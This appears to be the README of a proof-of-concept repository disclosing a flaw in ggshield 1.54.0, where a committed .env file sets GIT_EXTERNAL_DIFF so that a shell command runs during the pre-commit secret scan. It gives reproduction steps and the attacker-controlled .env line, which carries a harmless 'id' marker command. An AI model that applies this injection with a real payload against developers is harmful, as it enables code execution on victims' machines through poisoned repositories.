# ggshield GG-01 reproduction

This harmless repository demonstrates that ggshield 1.54.0 automatically loads
a tracked repository `.env` and exports every value to its Git subprocesses. The
single attacker-added file sets `GIT_EXTERNAL_DIFF` to an `id` proof command.
When ggshield scans an ordinary staged change, its own `git diff` executes that
command as the developer.

## Prerequisites

- Linux or macOS
- Git
- An ordinarily authenticated ggshield 1.54.0 installation

No compiler, binary payload, Docker, plugin, custom Git configuration, PATH
change, machine-specific path, or elevated privilege is required.

## Install ggshield

On Ubuntu or Debian:

```sh
sudo apt-get update
sudo apt-get install -y git pipx
pipx install 'ggshield==1.54.0'
export PATH="$HOME/.local/bin:$PATH"
ggshield auth login
ggshield --version
```

The final command must print `ggshield, version 1.54.0`.

## Reproduce the normal global-hook flow

Install the hook before cloning the repository:

```sh
ggshield install --mode global
git clone https://github.com/Jakick/ggshield-gg01-poc.git
cd ggshield-gg01-poc
printf '%s\n' 'changed by victim' >> application.txt
git add application.txt
git -c user.name=Victim -c user.email=victim@example.test commit -m reproduce
cat .ggshield-gg01-executed
```

Expected marker:

```text
uid=1000(victim) gid=1000(victim) groups=1000(victim)
```

The exact IDs vary. This is a normal successful commit through ggshield's
global pre-commit hook. The marker is ignored by Git.

## Minimum attacker-controlled content

The attacker only adds one text file named `.env`:

```dotenv
GIT_EXTERNAL_DIFF="sh -c 'id > .ggshield-gg01-executed'"
```

The application file is ordinary pre-existing repository content. After the
malicious `.env` is merged, any subsequent staged change that the victim commits
triggers the command. The payload performs no network access and writes only the
proof marker inside the checkout.

## Why ggshield introduces the behavior

Git does not load a repository `.env` by itself. ggshield finds that file and
loads every variable with overriding semantics. Its Git wrapper copies the
modified environment into a child process and does not remove
`GIT_EXTERNAL_DIFF` or pass `--no-ext-diff`. Git therefore treats the imported
value as an external diff command and executes it while ggshield is scanning.
